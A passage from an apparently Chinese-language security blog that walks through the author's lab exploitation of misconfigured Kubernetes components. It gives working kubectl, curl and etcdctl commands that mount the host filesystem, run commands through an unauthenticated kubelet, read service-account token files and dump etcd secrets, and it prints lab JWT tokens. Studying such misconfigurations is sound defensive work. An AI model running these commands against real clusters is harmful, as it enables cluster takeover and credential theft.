class="string">&quot;v1&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;metadata&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;annotations&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">            <span class="string">&quot;kubectl.kubernetes.io/last-applied-configuration&quot;</span>: <span class="string">&quot;&#123;<span class="subst">\&quot;</span>apiVersion<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>v1<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>kind<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Pod<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>metadata<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>annotations<span class="subst">\&quot;</span>:&#123;&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>namespace<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>default<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>spec<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>containers<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>image<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>nginx:1.14.2<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>test-44441<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>volumeMounts<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>mountPath<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/host<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;],<span class="subst">\&quot;</span>volumes<span class="subst">\&quot;</span>:[&#123;<span class="subst">\&quot;</span>hostPath<span class="subst">\&quot;</span>:&#123;<span class="subst">\&quot;</span>path<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>/<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>type<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>Directory<span class="subst">\&quot;</span>&#125;,<span class="subst">\&quot;</span>name<span class="subst">\&quot;</span>:<span class="subst">\&quot;</span>host<span class="subst">\&quot;</span>&#125;]&#125;&#125;<span class="subst">\n</span>&quot;</span></span></span><br><span class="line"><span class="swift">        &#125;,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;default&quot;</span></span></span><br><span class="line"><span class="swift">    &#125;,</span></span><br><span class="line"><span class="swift">    <span class="string">&quot;spec&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;containers&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;nginx:1.14.2&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test-44441&quot;</span>,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;volumeMounts&quot;</span>: [</span></span><br><span class="line"><span class="swift">                    &#123;</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/host&quot;</span>,</span></span><br><span class="line"><span class="swift">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">                    &#125;</span></span><br><span class="line"><span class="swift">                ]</span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ],</span></span><br><span class="line"><span class="swift">        <span class="string">&quot;volumes&quot;</span>: [</span></span><br><span class="line"><span class="swift">            &#123;</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;hostPath&quot;</span>: &#123;</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="swift">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Directory&quot;</span></span></span><br><span class="line"><span class="swift">                &#125;,</span></span><br><span class="line"><span class="swift">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;host&quot;</span></span></span><br><span class="line"><span class="swift">            &#125;</span></span><br><span class="line"><span class="swift">        ]</span></span><br><span class="line"><span class="swift">    &#125;</span></span><br><span class="line"><span class="swift">&#125;</span></span><br><span class="line"><span class="swift"></span></span><br></pre></td></tr></table></figure><p>回显201就表示创建成功了，</p><p><img src="/images/k8s/image-20240103094619945.png" alt="image-20240103094619945"></p><p><img src="/images/k8s/image-20240103094607986.png" alt="image-20240103094607986"></p><p>浏览器访问也就可以看到，也可以命令执行</p><p><img src="/images/k8s/image-20240103094714518.png" alt="image-20240103094714518"></p><p>笔者在测试的时候，一开始创建pod会失败，<br><img src="/images/k8s/image-20240103094849583.png" alt="image-20240103094849583"></p><p>输入kubectl describe pod test-44441 –namespace default，可以看到相关的报错</p><p><img src="/images/k8s/image-20240103095034621.png" alt="image-20240103095034621"></p><p>显示tomanyrequest，应该是拉取的太快了，</p><p><img src="/images/k8s/image-20240103095146163.png" alt="image-20240103095146163"></p><p>docker官方的说法是没登陆6小时拉去100，登录了之后6小时拉去200。应该是拉去太快了。<br>在该机器上执行命令<code>kubectl --insecure-skip-tls-verify -s https://ip:6443 --namespace=default exec -it test-44441 bash</code></p><p><img src="/images/k8s/image-20240103100033394.png" alt="image-20240103100033394"></p><p>感觉在实战中，这种创建pod的操作用不上，因为这里漏洞是未授权，而未授权可以接管整个k8s集群，那么再去创建一个pod起步多此一举。当然也可以用做是一个跳板，或者入口机。</p><h5 id="失败的从pod到api-server"><a href="#失败的从pod到api-server" class="headerlink" title="失败的从pod到api server"></a>失败的从pod到api server</h5><p>看了这个大师傅的文章</p><p><code>https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</code></p><p>大师傅的文章，是打华为云的比赛，在一个pod下面拿到了一个shell，然后从这个pod查看/run/secrets/kubernetes.io/serviceaccount/token文件获取了api-server的token，然后通过这个token 接管整个集群，从而达到了比赛的非预期。<br>那么思考，这个问题能不能在测试中利用。经过测试是不可以的。也不能说不可以，只能说鉴权不够，师傅的比赛环境，是管理员配置错误所导致的。</p><h6 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h6><p>首先如果我们进去一个pod之后，我们查看这个/run/secrets/kubernetes.io/serviceaccount/token文件，是所有权限都可以查看的，777。<br>大师傅在打比赛时创建的配置文件如下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    insecure-skip-tls-verify: true</span><br><span class="line">    server: https://10.247.0.1</span><br><span class="line">  name: cluster-name</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: cluster-name</span><br><span class="line">    namespace: test</span><br><span class="line">    user: admin</span><br><span class="line">  name: admin</span><br><span class="line">current-context: admin</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: admin</span><br><span class="line">  user:</span><br><span class="line">    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tbDh4OGIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjZiYTQzN2JkLTlhN2EtNGE0ZS1iZTk2LTkyMjkyMmZhNmZiOCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.XDrZLt7EeMVlTQbXNzb2rfWgTR4DPvKCpp5SftwtfGVUUdvDIOXgYtQip_lQIVOLvtApYtUpeboAecP8fTSVKwMsOLyNhI5hfy6ZrtTB6dKP0Vrl70pwpEvoSFfoI0Ej_NNPNjY3WXkCW5UG9j9uzDMW28z-crLhoIWknW-ae4oP6BNRBID-L1y3NMyngoXI2aaN9uud9M6Bh__YJi8pVxxg2eX9B4_FdOM8wu9EvfVlya502__xGMCZXXx7aHLx9_yzAPEtxUiI6oECo4HYUtyCJh_axBcNJZmwFTNEWp1DB3QcImBXr9P1qof9H1fAu-z12KLfC4-T3dnKLR9q5w</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228170140604.png" alt="image-20231228170140604"></p><p>可以看到配置文件中的权限是admin的，所以，想使用这个pod拿到shell，获取token打apiserver。</p><p>这里笔者在测试的时候，似乎这个pod连接不到apiserver，但是apiserver显示的确实是这里</p><p><img src="/images/k8s/image-20231228170625883.png" alt="image-20231228170625883"></p><p><img src="/images/k8s/image-20231228170434309.png" alt="image-20231228170434309"></p><p>这里比较我们两个的token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#我的 </span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkxES1FJRlNRcXVYenlhV0sxSWZrUVlOamxvR0JscTE1NGlmT1YyX1dLdkEifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJtZXRhcmdldCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLWpnOW5yIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI1MGRlOTI3My02ODczLTRiNzgtYjc3OS0yNGUzMTkwZDQzNmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6bWV0YXJnZXQ6ZGVmYXVsdCJ9.J07xNTfoXgXgFZCrlznwvA8v9h7_nokBxI4oWgml9x7S4L4UudHEdoQW8K7jBeNumLdMPjZ6bqi2A3e7D1S0iyHlxHbOeC9tigmy_FRTNKYIN5gziDhYvU393CeM8Juw9JcyAgYrigbbewzo61k-5a9EkTLPiHELbzKhrMwJLpuOiOdG2ISOxNGEqGjABOjGAqjzDHuWyM2XyeO5_FlLuQ1RA0nEO69U_Jfw29S5GBBfXZs4QyopsoyiR0ujW4nI3jYAGXIU37JhSsjkUDCRdPjgh4mp4dRRdUD8hH6rhZkTk30bBuc0y2ECwTHTTQd8G-QdooR5yckLwV_3l4Ww-w</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231228171126046.png" alt="image-20231228171126046"></p><p>大师傅的</p><p><img src="/images/k8s/image-20231228171159202.png" alt="image-20231228171159202"></p><p>可以看到，两者相差不多，且都是system:serviceaccount:default:default”，<br>这里猜测应该是管理员将将”system:serviceaccount”用户绑定到”cluster-admin”用户组，从而使得非预期存在，也就直接打通了apiserver</p><p><img src="/images/k8s/image-20231228171410372.png" alt="image-20231228171410372"></p><h5 id="获取宿主机权限-通过k8s-dashboard，创建特权Pods"><a href="#获取宿主机权限-通过k8s-dashboard，创建特权Pods" class="headerlink" title="获取宿主机权限-通过k8s dashboard，创建特权Pods"></a>获取宿主机权限-通过k8s dashboard，创建特权Pods</h5><h6 id="正常情况环境搭建"><a href="#正常情况环境搭建" class="headerlink" title="正常情况环境搭建"></a>正常情况环境搭建</h6><p>出现改问题的原因是因为在启动dashborad的时候，管理员为了方便，修改了配置，跳过了登录。<br>首先安装dashborad</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.2.0/aio/deploy/recommended.yaml</span><br><span class="line">vim recommended.yaml</span><br></pre></td></tr></table></figure><p>下载完成后，不可以直接访问，要起一下<br><code>kubectl apply -f recommended.yaml</code><br>然后在做映射<br><code> kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:80</code>,<br>将80端口映射出去，如果不行就映射443<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard 9090:443</code></p><p><img src="/images/k8s/image-20231229093200392.png" alt="image-20231229093200392"></p><p>这个时候应该还是访问不到到，因为没在配置文件中把访问ip改掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim recommended.yaml`后</span><br><span class="line">- -- insecure-bind-address=0.0.0.0</span><br><span class="line">把这个加进去，然后</span><br><span class="line">kubectl apply -f recommended.yaml</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231229104337062.png" alt="image-20231229104337062"></p><p>root@bohemian:/tools/k8syaml# kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard  9090:443<br>Forwarding from 127.0.0.1:9090 -&gt; 8443<br>Forwarding from [::1]:9090 -&gt; 8443</p><p>这种方式如果映射不成功的话，可以试试下面这种映射方式<br><code>kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</code></p><p>然后用google访问似乎不行，换成火狐就可以了<br>这里要注意，yaml的文本是非常严格的，笔者上图中的<code>- -- insecure-bind-address=0.0.0.0</code>是不对的，不要带那个空格，不让可能会出现connection refused</p><p><img src="/images/k8s/image-20240102103354695.png" alt="image-20240102103354695"></p><p><img src="/images/k8s/image-20231229104851735.png" alt="image-20231229104851735"></p><p><img src="/images/k8s/image-20231229104925231.png" alt="image-20231229104925231"></p><p>接下来就是创建账号，当然这里也可以使用从webshell获取到的token进行登录。<br>这里可以注意到，这个账户为admin-user，role为cluster-admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#sudo vim  account.yaml</span><br><span class="line"></span><br><span class="line"># Creating a Service Account</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"># Creating a ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#应用一下这个文件</span><br><span class="line">kubectl apply -f account.yaml </span><br><span class="line"># 获取token</span><br><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20231229112518290.png" alt="image-20231229112518290"><br><img src="/images/k8s/image-20240102103656050.png" alt="image-20240102103656050"><br>即可登录进来。<br>这里为了方便，我们用./metarget拉一个thinkphp</p><p>./metarget appv install thinkphp-5-0-23-rce –external<br>这样便搭建完成。<br>这里可以看到，在我们登录的过程中，是没有登录密码的，登录上来需要token，而这个token的获取需要登录到服务器上，这样是很麻烦的。所以管理员可能会在创建面板的时候配置跳过这个面板登录，这就给我们了可乘之机。</p><h5 id="skip配置错误环境搭建"><a href="#skip配置错误环境搭建" class="headerlink" title="skip配置错误环境搭建"></a>skip配置错误环境搭建</h5><p>其实就是在刚刚的那个配置文件中加一条语句即可<br><code>- --enable-skip-login</code><br>加完后更新一下配置。</p><p><img src="/images/k8s/image-20240102105257323.png" alt="image-20240102105257323"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#改完配置后加载一下配置</span><br><span class="line">kubectl apply -f recommended.yaml</span><br><span class="line">#转发端口更新一下</span><br><span class="line">kubectl -n kubernetes-dashboard port-rward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240102105809949.png" alt="image-20240102105809949"></p><p>这个时候就会发现有个跳过按钮了，直接点即可。点右上角的加号，创建pod，这里创建的时候报错，<br><img src="/images/k8s/image-20240102110940163.png" alt="image-20240102110940163"></p><p><img src="/images/k8s/image-20240102111212074.png" alt="image-20240102111212074"></p><p><code>Deploying file has failedroles.rbac.authorization.k8s.io is forbidden: User  &quot;system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard&quot; cannot create resource &quot;roles&quot; in API group &quot;rbac.authorization.k8s.io&quot; in the namespace &quot;default&quot;</code>没有权限，<br>根据这篇大师傅文章发现，还要有一个配置错误才可以<br>我们在配置文件中另起一行，添加如下内容</p><p><img src="/images/k8s/image-20240102135205095.png" alt="image-20240102135205095"></p><p>这里改完之后也不能控制面板，只能跳过登录上去，在渗透测试实战因为没有权限不似乎起不到什么作用。<br>我们还是使用token登录吧。登录上来之后就可以管理pods了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240103104129876.png" alt="image-20240103104129876"></p><p>可以看到defaultnamespace的pods，此时只需要选中pods执行即可进入到shell中</p><p><img src="/images/k8s/image-20240103104423300.png" alt="image-20240103104423300"></p><p><img src="/images/k8s/image-20240103104502239.png" alt="image-20240103104502239"></p><h5 id="k8s10250端口未授权"><a href="#k8s10250端口未授权" class="headerlink" title="k8s10250端口未授权"></a>k8s10250端口未授权</h5><p>默认安装k8s的时候，会自动暴漏10250端口，在这个端口上运行者kubelet，kubelet的作用是在集群中每个节点运行，对容器进行生命周期的管理。运行在集群的每个节点上，负责向 API Server 注册所在的节点<br>正常情况下，默认访问10250端口会显示404<br>访问其他路由会显示<code>Unauthorized</code></p><p><img src="/images/k8s/image-20240103135639112.png" alt="image-20240103135639112"></p><p><img src="/images/k8s/image-20240103135702207.png" alt="image-20240103135702207"></p><p>如果管理员误将配置信息配置错误，那将会导致直接接管整个k8s集群。<br>但是如果将/var/lib/kubelet/config.yaml</p><p><img src="/images/k8s/image-20240103140439505.png" alt="image-20240103140439505"></p><p>中的anonymous改为true，那么也就会导致所有的用户访问（<code>啊这，感觉这个漏洞在实战中出现的机率不大，目前还没看出来，管理员改这个的动机是什么。</code>）</p><p>其他大师傅的文章写了将authorization.mode修改为AlwaysAllow，这里我没有更改也成功了，也有可能是版本问题把，不太清楚了。</p><p><img src="/images/k8s/image-20240103141133148.png" alt="image-20240103141133148"></p><p>改完配置后，要重启一下<code>systemctl restart kubelet</code><br>这个时候再用浏览器访问<a href="https://ip:10250/runningpods/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84pods%E4%BA%86">https://ip:10250/runningpods/即可看到所有的pods了</a><br><img src="/images/k8s/image-20240103141430892.png" alt="image-20240103141430892"></p><p>访问这个端口不需要认证，那么就意味着，可以控制其中的pods了。<br><code>curl -XPOST -k &quot;https://$&#123;IP_ADDRESS&#125;:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=&lt;command-to-run&gt;&quot;</code><br>这个curl命令执行进行，其中需要三个参数，这三个参数可以在/runningpods/中获取，也就是上图<br><img src="/images/k8s/image-20240103141848633.png" alt="image-20240103141848633"></p><p><code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=id&quot;</code></p><p><img src="/images/k8s/image-20240103142250122.png" alt="image-20240103142250122"></p><p>也可以在浏览器中直接打</p><p><img src="/images/k8s/image-20240103161117043.png" alt="image-20240103161117043"></p><p>这样就直接可以命令执行了，<code>curl -XPOST -k &quot;https://ip:10250/run/default/test-44441/test-44441&quot; -d &quot;cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;</code>也可以使用这个命令获取该pods的token，但是，这里要注意，这个pods的token默认大概率不会是admin权限。当然这个token也是可以登录面板的。</p><p>一个 pod 与一个服务账户相关联，该服务账户的凭证（token）被放入该pod中每个容器的文件系统树，在 /var/run/secrets/kubernetes.io/serviceaccount/token</p><p>如果服务账号（Service account ）绑定了 cluster-admin （即集群的 admin 权限我们可以对所有namespace下实例进行操作） ，那么我们就可以通过 token 来进行一系列的操作</p><h6 id="意外的发现"><a href="#意外的发现" class="headerlink" title="意外的发现"></a>意外的发现</h6><p>在/runningpods/路由中，也查看到所有的运行的pods，那其实肯定还有其他的路由。<code>https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html</code>在这篇文章中列出了所有的api，其中我在logs路由中发现<br><img src="/images/k8s/image-20240103163719181.png" alt="image-20240103163719181"></p><p>存在目录遍历，仔细一看会发现，这好像是宿主主机上的/var/log、目录</p><p><img src="/images/k8s/image-20240103163810417.png" alt="image-20240103163810417"></p><p><img src="/images/k8s/image-20240103164555309.png" alt="image-20240103164555309"><br>那么也就是说，k8s在这里直接就映射了宿主主机的目录，并且是可以查看到</p><p><a href="https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)">https://ip:10250/logs/apache2/![image-20240103164438478](/images/k8s/image-20240103164438478.png)</a></p><p>我还特意装了一个apache的，访问默认日志完全没有问题<br><img src="/images/k8s/image-20240103164711573.png" alt="image-20240103164711573"></p><h5 id="k8setcd未授权"><a href="#k8setcd未授权" class="headerlink" title="k8setcd未授权"></a>k8setcd未授权</h5><p>在安装完 K8s 后，默认会安装 etcd 组件，etcd 是一个高可用的 key-value 数据库，它为 k8s 集群提供底层数据存储，保存了整个集群的状态。大多数情形下，数据库中的内容没有加密，因此如果黑客拿下 etcd，就意味着能控制整个 K8s 集群。</p><p>在 K8s 集群初始化后，etcd 默认就以 pod 的形式存在，可以执行如下命令进行查看，etcd 组件监听的端口为 2379。</p><h6 id="为什么会出现etcd未授权"><a href="#为什么会出现etcd未授权" class="headerlink" title="为什么会出现etcd未授权"></a>为什么会出现etcd未授权</h6><p>在启动etcd时，如果没有指定 –client-cert-auth 参数打开证书校验，并且把listen-client-urls监听修改为0.0.0.0那么也就意味着这个端口被暴露在外，如果没有通过安全组防火墙的限制，就会造成危害</p><p>etcd默认端口2379</p><p>ps: 不过在安装k8s之后默认的配置2379都只会监听127.0.0.1，而不会监听0.0.0.0，那么也就意味着最多就是本地访问，不能公网访问。<br>这里经过研究发现，好像不同的搭建方式，在暴漏端口的时候是不同的，笔者在搭建的时候用的是metarget这个项目，搭建出来，直接就对公网开放，在参考其他大师傅搭建</p><p><img src="/images/k8s/image-20240104094328343.png" alt="image-20240104094328343"></p><p>这里可以看到默认访问2379端口是需要认证的。</p><p><img src="/images/k8s/image-20240104094105258.png" alt="image-20240104094105258"></p><h6 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h6><p>很简单，只需要将etcd的配置文件/etc/kubernetes/manifests/etcd.yaml改一下即<br>可，此时将–client-cert-auth写入到这个配置文件里面。</p><p><img src="/images/k8s/image-20240104102215246.png" alt="image-20240104102215246"></p><p>但这样我没有成功，<br><img src="/images/k8s/image-20240104143156795.png" alt="image-20240104143156795"></p><p>笔者将这里的默认true改为false，不用其他操作，等一会即可，</p><p>当访问<a href="https://ip:2379/version%EF%BC%8C%E7%9A%84%E6%97%B6%E5%80%99%E5%87%BA%E7%8E%B0%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E8%AF%B4%E6%98%8E%E5%AD%98%E5%9C%A8etcd%E6%9C%AA%E6%8E%88%E6%9D%83%E3%80%82%E6%88%96%E8%80%85%60curl">https://ip:2379/version，的时候出现版本号，说明存在etcd未授权。或者`curl</a> <a href="https://ip:2379/version">https://ip:2379/version</a> -k`</p><p><img src="/images/k8s/image-20240104145945782.png" alt="image-20240104145945782"></p><p><img src="/images/k8s/image-20240104143249101.png" alt="image-20240104143249101"></p><p>这个时候就可以使用etcdctl打了，<br>首先安装etcdctl，在kali中，直接<code>apt install etcd-client</code>即可<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  / --keys-only --prefix=true</code>测试一下</p><p><img src="/images/k8s/image-20240104150302852.png" alt="image-20240104150302852"></p><p><code>经过对几个大师傅的文章分析，这个etcd未授权漏洞，都是直接获取apiserver的token，然后去到6443端口接管整个集群</code><br>etcdctl –insecure-transport=false –insecure-skip-tls-verify –endpoints=<a href="https://ip:2379/">https://ip:2379/</a> get  / –keys-only –prefix=true<br>执行这个命令会显示很多pods，images和其他信息，我们需要筛选一下重要的<br><code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  --keys-only --prefix=true &quot;/&quot; | grep /secrets/kube-system/clusterrole</code></p><p><img src="/images/k8s/image-20240104154342453.png" alt="image-20240104154342453"></p><p>就可以看到这个pods了，<br>接下来直接<code>etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://ip:2379/ get  /registry/secrets/kube-system/clusterrole-aggregation-controller-token-c2vnw</code>把那个get后面的替换掉即可<br><img src="/images/k8s/image-20240104154543659.png" alt="image-20240104154543659"></p><p>token就在下面<br><img src="/images/k8s/image-20240104154641021.png" alt="image-20240104154641021"></p><p>kubectl –insecure-skip-tls-verify -s <a href="https://ip:6443/">https://ip:6443</a> 